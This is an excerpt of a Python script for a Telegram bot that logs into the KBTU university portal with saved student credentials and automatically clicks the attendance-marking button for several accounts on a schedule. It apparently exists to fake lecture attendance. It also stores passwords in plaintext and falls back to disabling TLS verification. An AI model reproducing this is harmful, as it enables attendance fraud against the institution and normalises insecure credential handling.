import argparse
import json
import os
import signal
import sys
import threading
import time
import subprocess
import re
import platform
import psutil
import socket
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, Tuple

import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

BASE_URL = "https://wsp.kbtu.kz"
REG_URL = "https://wsp.kbtu.kz/RegistrationOnline"
NEWS_URL = "https://wsp.kbtu.kz/News"

# Телеграм токен: лучше задавать через переменную окружения
# export TELEGRAM_BOT_TOKEN=123456:ABCDEF
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
# Опциональный дебаг (по умолчанию выключен)
DEBUG_DEFAULT = False

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_DIR = os.path.join(ROOT_DIR, "data")
LOG_DIR = os.path.join(ROOT_DIR, "logs")
STATE_PATH = os.path.join(STATE_DIR, "state.json")
LOG_PATH = os.path.join(LOG_DIR, "events.jsonl")

STATE_LOCK = threading.Lock()
WORKERS: Dict[str, "AttendanceWorker"] = {}
SHUTDOWN = threading.Event()
BATTERY_LOCK = threading.Lock()
BATTERY_LAST_CHECK: float = 0.0
BATTERY_LAST_WARNED: bool = False

def kill_zombies() -> None:
    try:
        import psutil
        import time
        for proc in psutil.process_iter(['name', 'create_time']):
            try:
                name = proc.info.get('name', '').lower()
                if 'chrome' in name or 'chromium' in name or 'chromedriver' in name:
                    if time.time() - proc.info['create_time'] > 7200:
                        proc.kill()
            except Exception:
                pass
    except Exception:
        pass

def zombie_killer_loop() -> None:
    while not SHUTDOWN.is_set():
        kill_zombies()
        time.sleep(600)

threading.Thread(target=zombie_killer_loop, daemon=True).start()


DAYS_RU = {
    "пн": 0,
    "пон": 0,
    "понедельник": 0,
    "вт": 1,
    "вторник": 1,
    "ср": 2,
    "среда": 2,
    "чт": 3,
    "четверг": 3,
    "пт": 4,
    "пятница": 4,
    "сб": 5,
    "суббота": 5,
    "вс": 6,
    "воскресенье": 6,
}


# -------------------- Storage & Logging --------------------


def ensure_dirs() -> None:
    os.makedirs(STATE_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)


def default_state() -> Dict[str, Any]:
    return {
        "admins": {
            "main": "blinyho4",
            "whitelist": ["blinyho4"],
            "chat_ids": [],
        },
        "settings": {
            "headless": True,
            "debug": DEBUG_DEFAULT,
            "check_interval_sec": 10,
            "refresh_interval_sec": 25,
            "heartbeat_sec": 600,
            "timezone_offset_hours": 5,
        },
        "accounts": {},
        "runtime": {},
    }


def load_state() -> Dict[str, Any]:
    ensure_dirs()
    if not os.path.exists(STATE_PATH):
        st = default_state()
        save_state(st)
        return st
    try:
        with open(STATE_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        st = default_state()
        save_state(st)
        return st


def save_state(state: Dict[str, Any]) -> None:
    ensure_dirs()
    tmp = STATE_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(state, f, ensure_ascii=False, indent=2)
    os.replace(tmp, STATE_PATH)


def log_event(event: str, **fields: Any) -> None:
    ensure_dirs()
    row = {"ts": datetime.now().isoformat(timespec="seconds"), "event": event}
    row.update(fields)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(json.dumps(row, ensure_ascii=False) + "\n")


# -------------------- Helpers --------------------


def wait_for_internet(url: str = BASE_URL, attempts: int = 3, timeout: int = 4) -> bool:
    for _ in range(attempts):
        if SHUTDOWN.is_set():
            return False
        try:
            r = requests.get(url, timeout=timeout)
            if 100 <= r.status_code < 600:
                return True
        except requests.RequestException:
            # Фоллбек без проверки сертификатов, чтобы не ловить ложные оффлайны
            try:
                r = requests.get(url, timeout=timeout, verify=False)
                if 100 <= r.status_code < 600:
                    return True
            except requests.RequestException:
                pass
        time.sleep(1)
    return False


def format_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds} сек"
    minutes = seconds // 60
    if minutes < 60:
        return f"{minutes} мин"
    hours = minutes // 60
    if hours < 24:
        return f"{hours} ч"
    days = hours // 24
    return f"{days} дн"


def schedule_active(schedule: List[Dict[str, Any]]) -> bool:
    if not schedule:
        return False
    state = load_state()
    tz_offset = state.get("settings", {}).get("timezone_offset_hours", 5)
    try:
        tz_offset = int(tz_offset)
    except Exception:
        tz_offset = 5
    from datetime import timezone
    now = datetime.now(timezone.utc).replace(tzinfo=None) + timedelta(hours=tz_offset)
    dow = now.weekday()
    current_time_minutes = now.hour * 60 + now.minute
    for item in schedule:
        days = item.get("days", [])
        start = item.get("start")
        end = item.get("end")
        if days and dow not in days:
            continue
        if start is None or end is None:
            continue
        if start <= current_time_minutes <= end:
            return True
    return False


def parse_schedule(text: str) -> List[Dict[str, Any]]:
    raw = text.lower().replace(";", ",")
    parts = [p.strip() for p in raw.split(",") if p.strip()]
    result: List[Dict[str, Any]] = []
    for part in parts:
        tokens = part.lower().split()
        if len(tokens) < 2:
            continue
        days_token = tokens[0]
        time_token = tokens[1]

        days: List[int] = []
        if "-" in days_token:
            a, b = [x.strip() for x in days_token.split("-", 1)]
            if a in DAYS_RU and b in DAYS_RU:
                start_day = DAYS_RU[a]
                end_day = DAYS_RU[b]
                if start_day <= end_day:
                    days = list(range(start_day, end_day + 1))
                else:
                    days = list(range(start_day, 7)) + list(range(0, end_day + 1))
        else:
            if days_token in DAYS_RU:
                days = [DAYS_RU[days_token]]

        if not days:
            continue

        if "-" not in time_token:
            continue
        t1_str, t2_str = [x.strip() for x in time_token.split("-", 1)]
        
        def parse_time(time_str: str) -> Optional[int]:
            if ":" in time_str:
                h_str, m_str = time_str.split(":", 1)
            else:
                h_str, m_str = time_str, "0"
            if h_str.isdigit() and m_str.isdigit():
                hour = int(h_str)
                minute = int(m_str)
                if 0 <= hour <= 23 and 0 <= minute <= 59:
                    return hour * 60 + minute
            return None

        start_time = parse_time(t1_str)
        end_time = parse_time(t2_str)
        
        if start_time is None or end_time is None:
            continue
        if start_time >= end_time:
            continue

        result.append({"days": days, "start": start_time, "end": end_time})
    return result


# -------------------- State Access --------------------


def get_account(alias: str) -> Optional[Dict[str, Any]]:
    with STATE_LOCK:
        state = load_state()
        return state.get("accounts", {}).get(alias)


def set_account(alias: str, data: Dict[str, Any]) -> None:
    with STATE_LOCK:
        state = load_state()
        state.setdefault("accounts", {})[alias] = data
        save_state(state)


def remove_account(alias: str) -> bool:
    with STATE_LOCK:
        state = load_state()
        if alias in state.get("accounts", {}):
            del state["accounts"][alias]
            if alias in state.get("runtime", {}):
                del state["runtime"][alias]
            save_state(state)
            return True
    return False


def get_runtime(alias: str) -> Dict[str, Any]:
    with STATE_LOCK:
        state = load_state()
        return state.get("runtime", {}).get(alias, {})


def set_runtime(alias: str, data: Dict[str, Any]) -> None:
    with STATE_LOCK:
        state = load_state()
        state.setdefault("runtime", {})[alias] = data
        save_state(state)


def get_setting(account: Dict[str, Any], key: str, default: Any) -> Any:
    if "settings" in account and key in account["settings"]:
        return account["settings"][key]
    state = load_state()
    return state.get("settings", {}).get(key, default)


def set_global_setting(key: str, value: Any) -> None:
    with STATE_LOCK:
        state = load_state()
        state.setdefault("settings", {})[key] = value
        save_state(state)


def set_account_setting(alias: str, key: str, value: Any) -> bool:
    with STATE_LOCK:
        state = load_state()
        acc = state.get("accounts", {}).get(alias)
        if not acc:
            return False
        acc.setdefault("settings", {})[key] = value
        state["accounts"][alias] = acc
        save_state(state)
    return True


def enable_account(alias: str, manual: bool = False) -> bool:
    with STATE_LOCK:
        state = load_state()
        acc = state.get("accounts", {}).get(alias)
        if not acc:
            return False
        acc["enabled"] = True
        acc["manual"] = manual
        state["accounts"][alias] = acc
        save_state(state)
    return True


def disable_account(alias: str, reason: str = "manual") -> None:
    with STATE_LOCK:
        state = load_state()
        acc = state.get("accounts", {}).get(alias)
        if acc:
            acc["enabled"] = False
            acc["manual"] = False
            state["accounts"][alias] = acc
            rt = state.get("runtime", {}).get(alias, {})
            rt["active_since"] = None
            rt["last_status"] = "idle"
            rt["is_active_now"] = False
            state.setdefault("runtime", {})[alias] = rt
            save_state(state)
    log_event("disabled", alias=alias, reason=reason)


def add_chat_id(chat_id: int) -> None:
    with STATE_LOCK:
        state = load_state()
        admin = state.get("admins", {})
        if chat_id not in admin.get("chat_ids", []):
            admin.setdefault("chat_ids", []).append(chat_id)
            state["admins"] = admin
            save_state(state)


def is_admin(username: str) -> bool:
    state = load_state()
    admins = state.get("admins", {})
    return username in admins.get("whitelist", [])


def is_main_admin(username: str) -> bool:
    state = load_state()
    return username == state.get("admins", {}).get("main")


def whitelist_add(username: str) -> None:
    with STATE_LOCK:
        state = load_state()
        admins = state.get("admins", {})
        wl = admins.get("whitelist", [])
        if username not in wl:
            wl.append(username)
        admins["whitelist"] = wl
        state["admins"] = admins
        save_state(state)


def whitelist_remove(username: str) -> None:
    with STATE_LOCK:
        state = load_state()
        admins = state.get("admins", {})
        wl = admins.get("whitelist", [])
        if username in wl:
            wl.remove(username)
        admins["whitelist"] = wl
        state["admins"] = admins
        save_state(state)


# -------------------- Notifier --------------------


class Notifier:
    def send_all(self, message: str) -> None:
        state = load_state()
        chat_ids = state.get("admins", {}).get("chat_ids", [])
        for cid in chat_ids:
            self._send(cid, message)

    def _send(self, chat_id: int, message: str, reply_markup: Optional[Dict[str, Any]] = None) -> None:
        raise NotImplementedError


class TelegramNotifier(Notifier):
    def __init__(self, token: str):
        self.token = token

    def _send(self, chat_id: int, message: str, reply_markup: Optional[Dict[str, Any]] = None) -> None:
        try:
            data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
            if reply_markup:
                data["reply_markup"] = json.dumps(reply_markup, ensure_ascii=False)
            requests.post(
                f"https://api.telegram.org/bot{self.token}/sendMessage",
                data=data,
                timeout=6,
            )
        except Exception:
            pass


# -------------------- Selenium Worker --------------------


class AttendanceWorker(threading.Thread):
    def __init__(self, alias: str, notifier: Notifier):
        super().__init__(daemon=True)
        self.alias = alias
        self.notifier = notifier
        self.driver: Optional[webdriver.Chrome] = None
        self.stop_event = threading.Event()
        self._online: Optional[bool] = None
        self._active: bool = False
        self._logged_in: bool = False
        self._net_fail_count: int = 0
        self._started_at_ts: Optional[float] = None
        self._next_heartbeat_ts: Optional[float] = None
        self._driver_started_at: float = 0

    def run(self) -> None:
        self.notifier.send_all(f"[{self.alias}] ✅ Бот запущен.")
        self._started_at_ts = time.time()
        self._next_heartbeat_ts = self._started_at_ts + 600
        while not SHUTDOWN.is_set() and not self.stop_event.is_set():
            acc = get_account(self.alias)
            if not acc:
                self._close_driver()
                time.sleep(2)
                continue

            if not acc.get("enabled", False):
                self._set_active(False)
                self._close_driver()
                time.sleep(2)
                continue

            active_now = acc.get("manual", False) or schedule_active(acc.get("schedule", []))
            self._set_active(active_now)

            if not active_now:
                self._close_driver()
                time.sleep(20)
                continue

            try:
                # Если драйвер уже был создан, проверяем его «живучесть»
                if self.driver:
                    if time.time() - getattr(self, '_driver_started_at', 0) > 3600:
                        log_event("driver_recycled", alias=self.alias)
                        self._close_driver()
                    else:
                        try:
                            # Простой пинг: запрашиваем текущий URL
                            self.driver.current_url
                        except Exception:
                            log_event("driver_dead", alias=self.alias)
                            self._close_driver()

                self._ensure_driver()

                rt_clear = get_runtime(self.alias)
                if "last_error" in rt_clear:
                    rt_clear.pop("last_error", None)
                    rt_clear.pop("last_error_ts", None)
                    set_runtime(self.alias, rt_clear)

                acc = get_account(self.alias)
                if not acc or not acc.get("enabled", False):
                    self._set_active(False)
                    self._close_driver()
                    time.sleep(1)
                    continue

                if not self._ensure_logged_in(acc["username"], acc["password"]):
                    time.sleep(5)
                    continue

                if not self._ensure_registration_page(acc["username"], acc["password"]):
                    time.sleep(5)
                    continue

                status, marked = self._try_attend()
                if status == "MARKED" and marked:
                    rt = get_runtime(self.alias)
                    rt["total_marked"] = rt.get("total_marked", 0) + 1
                    rt["consecutive_marked"] = rt.get("consecutive_marked", 0) + 1
                    rt["last_mark_ts"] = datetime.now().isoformat(timespec="seconds")
                    rt["last_status"] = "marked"
                    set_runtime(self.alias, rt)

                    lesson_title, teacher, lesson_time = marked
                    log_event(
                        "marked",
                        alias=self.alias,
                        lesson=lesson_title,
                        teacher=teacher,
                        lesson_time=lesson_time,
                    )
                    self.notifier.send_all(
                        f"[{self.alias}] ✅ Отметился: {lesson_title} | {teacher} | {lesson_time}"
                    )

                elif status == "SKIP":
                    self._wait_for_break()
                else:
                    rt = get_runtime(self.alias)
                    if rt.get("consecutive_marked", 0) != 0:
                        rt["consecutive_marked"] = 0
                        set_runtime(self.alias, rt)

                check_interval = int(get_setting(acc, "check_interval_sec", 10))
                time.sleep(check_interval)

            except Exception as e:
                error_str = str(e)
                log_event("worker_error", alias=self.alias, error=error_str)
                rt = get_runtime(self.alias)
                rt["last_error"] = error_str
                rt["last_error_ts"] = datetime.now().isoformat(timespec="seconds")
                set_runtime(self.alias, rt)
                time.sleep(5)

            maybe_warn_low_battery(self.notifier)
            self._heartbeat()
        self._close_driver()

    def stop(self) -> None:
        self.stop_event.set()
        self._close_driver()

    def _set_active(self, active: bool) -> None:
        rt = get_runtime(self.alias)
        if active and not self._active:
            rt["active_since"] = datetime.now().isoformat(timespec="seconds")
            rt["last_status"] = "active"
            rt["is_active_now"] = True
            set_runtime(self.alias, rt)
            self.notifier.send_all(f"[{self.alias}] ▶️ Активен (проверка началась).")
        if not active and self._active:
            rt["active_since"] = None
            rt["last_status"] = "idle"
            rt["is_active_now"] = False
            set_runtime(self.alias, rt)
            self.notifier.send_all(f"[{self.alias}] ⏸ Пауза (по расписанию).")
        if active == self._active:
            rt["is_active_now"] = active
            set_runtime(self.alias, rt)
        self._active = active

    def _ensure_driver(self) -> None:
        if self.driver:
            return
        options = ChromeOptions()

        acc = get_account(self.alias) or {}
        headless = bool(get_setting(acc, "headless", True))
        if headless:
            options.add_argument("--headless=new")

        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-sync")
        options.add_argument("--disable-default-apps")
        options.add_argument("--mute-audio")
        options.add_argument("--metrics-recording-only")
        options.add_argument("--disable-background-timer-throttling")
        options.add_argument("--disable-renderer-backgrounding")
        options.add_argument("--disable-popup-blocking")
        options.add_argument("--disable-translate")
        options.add_argument("--disable-features=TranslateUI,BlinkGenPropertyTrees")
        options.add_argument("--hide-scrollbars")
        options.add_argument("--window-size=1200,800")
        options.add_argument("--force-device-scale-factor=1")
        options.add_argument("--disable-notifications")
        options.add_argument("--disable-infobars")
        options.add_argument("--disk-cache-size=0")
        options.add_argument("--media-cache-size=0")
        options.add_argument("--remote-debugging-port=0")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--js-flags='--max-old-space-size=256'") # Ограничиваем JS память
        
        user_data_dir = os.path.join(STATE_DIR, "chrome", self.alias)
        os.makedirs(user_data_dir, exist_ok=True)
        options.add_argument(f"--user-data-dir={user_data_dir}")

        options.page_load_strategy = 'eager' # Не ждем загрузки всех картинок

        import shutil
        from selenium.webdriver.chrome.service import Service

        chromium_path = shutil.which("chromium-browser") or shutil.which("chromium")
        if chromium_path:
            options.binary_location = chromium_path

        # 1. Приоритет: системный драйвер (особенно важно для ARM64)
        driver_path = shutil.which("chromedriver")
        service = Service(executable_path=driver_path) if driver_path else None

        # 2. Проверка архитектуры
        arch = platform.machine().lower()
        is_arm = "arm" in arch or "aarch64" in arch

        try:
            if service:
                # Если системный драйвер найден, пробуем его
                self.driver = webdriver.Chrome(service=service, options=options)
            elif not is_arm:
                # Если не ARM, пробуем запуск без явного сервиса (авто-поиск Selenium)
                self.driver = webdriver.Chrome(options=options)
            else:
                # На ARM без системного драйвера ловить нечего
                raise RuntimeError("Chromedriver not found in PATH (required for ARM64)")

        except Exception as primary_err:
            log_event(
                "chromedriver_fallback_setup",
                alias=self.alias,
                primary_error=str(primary_err),
                arch=arch
            )

            # Если сервис запущен, но webdriver упал - надо прибить процесс драйвера
            if service and hasattr(service, 'process') and service.process:
                try:
                    service.process.kill()
                except Exception:
                    pass

            # На ARM64 официальных драйверов для скачивания нет, поэтому фолбэк webdriver-manager
            # скорее всего выдаст 'Exec format error'. Предупреждаем об этом.
            if is_arm:
                raise RuntimeError(
                    f"ARM64/Aarch64 detected. System chromedriver failed or missing.\n"
                    f"Error: {primary_err}\n"
                    f"FIX: Попробуйте перезапустить бота ('sudo systemctl restart att_bot'), так как Chrome был обновлен или кончилась память. Чтобы полностью переустановить, выполните 'sudo apt update && sudo apt install -y chromium-chromedriver'"
                ) from primary_err

            # Фолбэк для обычных x86_64 систем: webdriver-manager
            try:
                from webdriver_manager.chrome import ChromeDriverManager
                from webdriver_manager.core.os_manager import ChromeType

                if chromium_path:
                    mgr_service = Service(
                        ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install()
                    )
                else:
                    mgr_service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=mgr_service, options=options)
            except Exception as fallback_err:
                log_event(
                    "chromedriver_fallback_failed",
                    alias=self.alias,
                    error=str(fallback_err),
                )
                raise RuntimeError(
                    f"Не удалось запустить ChromeDriver.\n"
                    f"Архитектура: {arch}\n"
                    f"Основная ошибка: {primary_err}\n"
                    f"Fallback ошибка: {fallback_err}"
                ) from fallback_err

        if self.driver:
            self.driver.set_page_load_timeout(30)
            self.driver.set_script_timeout(30)
            self._logged_in = False
            self._driver_started_at = time.time()

    def _close_driver(self) -> None:
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None
        self._logged_in = False

    def _ensure_logged_in(self, username: str, password: str) -> bool:
        assert self.driver
        # Если уже на нужной странице — не дергаем логин
        current = self.driver.current_url or ""
        if "RegistrationOnline" in current or "News" in current:
            if not self._logged_in:
                self.notifier.send_all(f"[{self.alias}] ✅ Сессия активна.")
            self._logged_in = True
            return True

        online = wait_for_internet()
        if online:
            self._net_fail_count = 0
        else:
            self._net_fail_count += 1

        # Сообщаем о потере/восстановлении только при устойчивом изменении
        if self._net_fail_count >= 3 and self._online is not False:
            self._online = False
            self.notifier.send_all(f"[{self.alias}] 🌐 Потеряно соединение.")
            log_event("net_offline", alias=self.alias)
        elif self._net_fail_count == 0 and self._online is not True:
            self._online = True
            self.notifier.send_all(f"[{self.alias}] 🌐 Подключился к сайту.")
            log_event("net_online", alias=self.alias)

        try:
            self.driver.get(BASE_URL)

            if self.driver.current_url in (NEWS_URL, REG_URL):
                if not self._logged_in:
                    self.notifier.send_all(f"[{self.alias}] ✅ Сессия активна.")
                self._logged_in = True
                return True

            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.v-overlay-container"))
            )

            login_button = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.v-slot.v-align-right div[role='button']"))
            )
            self.driver.execute_script("arguments[0].click();", login_button)

            username_input = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input.v-filterselect-input"))
            )
            self.driver.execute_script(
                """
                arguments[0].value = '';
                arguments[0].dispatchEvent(new Event('input'));
                arguments[0].dispatchEvent(new Event('change'));
                """,
                username_input,
            )
            username_input.send_keys(username)
            time.sleep(0.3)

            password_input = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password'].v-textfield"))
            )
            password_input.clear()
            password_input.send_keys(password)

            enter_button = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.v-button.v-widget.primary.v-button-primary"))
            )
            enter_button.click()

            WebDriverWait(self.driver, 8).until(
                lambda d: d.current_url in (NEWS_URL, REG_URL)
            )

            if not self._logged_in:
                self.notifier.send_all(f"[{self.alias}] ✅ Логин успешен.")
                log_event("login_ok", alias=self.alias)
            self._logged_in = True
            return True

        except TimeoutException:
            log_event("login_failed", alias=self.alias)
            self.notifier.send_all(f"[{self.alias}] ❌ Логин не удался.")
            self._logged_in = False
            return False
        except WebDriverException as e:
            log_event("webdriver_error", alias=self.alias, error=str(e))
            self._logged_in = False
            return False

    def _ensure_registration_page(self, username: str, password: str) -> bool:
        assert self.driver
        try:
            current = self.driver.current_url or ""
            if "RegistrationOnline" in current:
                # Иногда логин-форма показывается прямо на RegistrationOnline
                if self._is_login_form_present():
                    if not self._ensure_logged_in(username, password):
                        return False
                    self.driver.get(REG_URL)
                    return "RegistrationOnline" in (self.driver.current_url or "")
                return True

            # Всегда стараемся оставаться на RegistrationOnline
            self.driver.get(REG_URL)

            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "div.v-app"))
            )

            current = self.driver.current_url or ""
            if "RegistrationOnline" in current:
                return True

            # Возможно, выбросило на логин
            if not self._ensure_logged_in(username, password):
                return False

            self.driver.get(REG_URL)
            return "RegistrationOnline" in (self.driver.current_url or "")
        except Exception:
            return False

    def _is_login_form_present(self) -> bool:
        assert self.driver
        try:
            # Логин-форма Vaadin на странице
            user_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input.v-filterselect-input")
            pass_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='password'].v-textfield")
            login_buttons = self.driver.find_elements(
                By.CSS_SELECTOR, "div.v-button.v-widget.primary.v-button-primary"
            )
            return bool(user_inputs and pass_inputs and login_buttons)
        except Exception:
            return False

    def _try_attend(self) -> Tuple[str, Optional[Tuple[str, str, str]]]:
        assert self.driver
        try:
            attend_button = WebDriverWait(self.driver, 8).until(
                EC.element_to_be_clickable(
                    (
                        By.XPATH,
                        "//div[contains(@class, 'v-button') and contains(@class, 'primary') and "
                        "contains(@class, 'v-button-primary') and .//span[text()='Отметиться']]",
                    )
                )
            )
        except TimeoutException:
            refresh_interval = int(get_setting(get_account(self.alias) or {}, "refresh_interval_sec", 25))
            time.sleep(refresh_interval)
            try:
                self.driver.refresh()
            except Exception:
                pass
            return "NONE", None

        rt = get_runtime(self.alias)
        if rt.get("consecutive_marked", 0) >= 2:
            log_event("skip_third", alias=self.alias)
            return "SKIP", None

        try:
            parent_card = attend_button.find_element(By.XPATH, "./ancestor::div[contains(@class, 'card')]")
            info_element = parent_card.find_element(
                By.XPATH, ".//div[contains(@class, 'v-label') and contains(@class, 'bold')]"
            )
            info_text = info_element.text.strip()
            info_lines = info_text.split("\n")
            lesson_title = info_lines[0].strip() if len(info_lines) > 0 else "Unknown"
            teacher = info_lines[1].strip() if len(info_lines) > 1 else "Unknown"
            lesson_time = info_lines[2].strip() if len(info_lines) > 2 else "Unknown"

            attend_button.click()
            return "MARKED", (lesson_title, teacher, lesson_time)
        except Exception as e:
            log_event("attend_error", alias=self.alias, error=str(e))
            return "NONE", None

    def _wait_for_break(self) -> None:
        assert self.driver
        for _ in range(6):
            if SHUTDOWN.is_set() or self.stop_event.is_set():
                return
            try:
                self.driver.refresh()
                WebDriverWait(self.driver, 6).until(
                    EC.invisibility_of_element_located(
                        (
                            By.XPATH,
                            "//div[contains(@class, 'v-button') and contains(@class, 'primary') and "
                            "contains(@class, 'v-button-primary') and .//span[text()='Отметиться']]",
                        )
                    )
                )
                rt = get_runtime(self.alias)
                rt["consecutive_marked"] = 0
                set_runtime(self.alias, rt)
                return
            except TimeoutException:
                time.sleep(20)

    def _debug(self, event: str, **fields: Any) -> None:
        acc = get_account(self.alias) or {}
        debug = bool(get_setting(acc, "debug", DEBUG_DEFAULT))
        if not debug:
            return
        payload = " ".join([f"{k}={v}" for k, v in fields.items()])
        msg = f"[{self.alias}] DEBUG {event}" + (f" {payload}" if payload else "")
        self.notifier.send_all(msg)
        log_event("debug", alias=self.alias, debug_event=event, **fields)

    def _heartbeat(self) -> None:
        if self._started_at_ts is None or self._next_heartbeat_ts is None:
            return

        now = time.time()
        while now >= self._next_heartbeat_ts:
            elapsed = int(now - self._started_at_ts)
            self.notifier.send_all(f"[{self.alias}] ✅ Работает уже {format_duration(elapsed)}.")

            # Инкрементальный heartbeat:
            # до 30 минут -> каждые 10 минут
            # до 2 часов -> каждые 30 минут
            # дальше -> каждый час
            if elapsed < 1800:
                step = 600
            elif elapsed < 7200:
                step = 1800
            else:
                step = 3600
            self._next_heartbeat_ts += step


# -------------------- Worker Management --------------------


def ensure_worker(alias: str, notifier: Notifier) -> None:
    if alias in WORKERS and WORKERS[alias].is_alive():
        return
    worker = AttendanceWorker(alias, notifier)
    WORKERS[alias] = worker
    worker.start()


def start_all_workers(notifier: Notifier) -> None:
    state = load_state()
    for alias in state.get("accounts", {}):
        ensure_worker(alias, notifier)


def stop_all_workers() -> None:
    for w in WORKERS.values():
        w.stop()


# -------------------- Status --------------------


def format_status(alias: str) -> str:
    acc = get_account(alias)
    if not acc:
        return f"❌ <b>{alias}</b> не найден"
    rt = get_runtime(alias)
    
    enabled = "✅" if acc.get("enabled", False) else "🚫"
    manual = "✅" if acc.get("manual", False) else "🚫"
    
    worker = WORKERS.get(alias)
    if worker and worker.is_alive():
        is_active_now = bool(worker._active)
        browser_active = worker.driver is not None
    else:
        is_active_now = bool(rt.get("is_active_now", False))
        browser_active = False
        
    activity_icon = "🟢 В работе" if is_active_now else "🔴 Ожидание"
    browser_icon = "🌐 Открыт" if browser_active else "🛑 Закрыт"
    
    total = rt.get("total_marked", 0)
    consecutive = rt.get("consecutive_marked", 0)
    last_mark = rt.get("last_mark_ts") or "никогда"
    
    active_since = rt.get("active_since")
    if active_since:
        try:
            delta = datetime.now() - datetime.fromisoformat(active_since)
            active_dur = format_duration(int(delta.total_seconds()))
        except Exception:
            active_dur = "-"
    else:
        active_dur = "0 сек"
        
    sched = acc.get("schedule", [])
    
    def fmt_time(mnts: int) -> str:
        return f"{mnts//60:02d}:{mnts%60:02d}"
        
    sched_str = []
    days_rev = {v: k for k, v in DAYS_RU.items() if len(k) == 2}
    for item in sched:
        d = ", ".join([days_rev.get(day, str(day)) for day in item.get("days", [])])
        st = fmt_time(item.get("start", 0))
        en = fmt_time(item.get("end", 0))
        sched_str.append(f"{d} {st}-{en}")
        
    sched_disp = "; ".join(sched_str) if sched_str else "не задано"
    
    login = acc.get("username", "-")
    
    err_out = ""
    last_err = rt.get("last_error")
    if last_err:
        last_err_ts = rt.get("last_error_ts", "")
        err_out = f"\n⚠️ <b>Ошибка:</b> <code>{last_err[:200]}</code> ({last_err_ts})"

    return (
        f"👤 <b>Аккаунт:</b> {alias}\n"
        f"├ <b>Логин:</b> <code>{login}</code>\n"
        f"├ <b>Включен:</b> {enabled} | <b>Ручной:</b> {manual}\n"
        f"├ <b>Браузер:</b> {browser_icon}\n"
        f"├ <b>Статус:</b> {activity_icon} ({active_dur})\n"
        f"├ <b>Отметки:</b> всего <b>{total}</b>, подряд <b>{consecutive}</b>\n"
        f"├ <b>Последняя:</b> {last_mark}\n"
        f"└ <b>Расписание:</b> {sched_disp}{err_out}\n"
    )


# -------------------- Telegram Bot (requests polling) --------------------


def tg_request(token: str, method: str, data: Dict[str, Any]) -> Dict[str, Any]:
    url = f"https://api.telegram.org/bot{token}/{method}"
    r = requests.post(url, data=data, timeout=10)
    try:
        return r.json()
    except Exception:
        return {"ok": False, "result": []}


def get_battery_status() -> Optional[Dict[str, Any]]:
    out = ""
    try:
        out = subprocess.run(
            ["/usr/bin/pmset", "-g", "batt"],
            capture_output=True,
            text=True,
            check=False,
        ).stdout
    except Exception:
        out = ""

    if not out:
        try:
            out = subprocess.run(
                ["/usr/sbin/ioreg", "-rn", "AppleSmartBattery"],
                capture_output=True,
                text=True,
                check=False,
            ).stdout
        except Exception:
            out = ""

    if not out:
        return None

    # pmset output example: '... 85%; discharging; ...'
    m = re.search(r"(\d+)%", out)
    if m:
        percent = int(m.group(1))
        low = out.lower()
        state_match = re.search(r"\d+%;\s*([^;]+);", low)
        state = state_match.group(1).strip() if state_match else ""

        # `not charging` must be False; previously it was matched as True by substring.
        if "not charging" in state or "discharging" in state or "charged" in state:
            charging = False
        elif "charging" in state:
            charging = True
        else:
            charging = False
        return {"percent": percent, "charging": charging, "raw": out.strip()}

    # ioreg output fallback: "CurrentCapacity" and "MaxCapacity"
    try:
        cur = re.search(r"\"CurrentCapacity\"\s*=\s*(\d+)", out)
        maxc = re.search(r"\"MaxCapacity\"\s*=\s*(\d+)", out)
        if cur and maxc:
            cur_v = int(cur.group(1))
            max_v = int(maxc.group(1))
            percent = int((cur_v / max_v) * 100) if max_v > 0 else 0
            low = out.lower()
            is_charging_match = re.search(r"\"ischarging\"\s*=\s*(yes|no|1|0|true|false)", low)
            if is_charging_match:
                charging_raw = is_charging_match.group(1)
                charging = charging_raw in ("yes", "1", "true")
            else:
                charging = False
            return {"percent": percent, "charging": charging, "raw": out.strip()}
    except Exception:
        return None

    return None


def maybe_warn_low_battery(notifier: "Notifier", threshold: int = 20, interval_sec: int = 60) -> None:
    global BATTERY_LAST_CHECK, BATTERY_LAST_WARNED
    now = time.time()
    with BATTERY_LOCK:
        if now - BATTERY_LAST_CHECK < interval_sec:
            return
        BATTERY_LAST_CHECK = now
        status = get_battery_status()
        if not status:
            return
        low = status["percent"] <= threshold and not status["charging"]
        if low and not BATTERY_LAST_WARNED:
            notifier.send_all(
                f"⚠️ Низкий заряд: {status['percent']}% (не заряжается)."
            )
            BATTERY_LAST_WARNED = True
        if not low:
            BATTERY_LAST_WARNED = False


def tg_main_menu_markup() -> Dict[str, Any]:
    state = load_state()
    headless_global = state.get("settings", {}).get("headless", True)
    h_text = "🟢 Headless: Вкл" if headless_global else "🔴 Headless: Выкл"
    return {
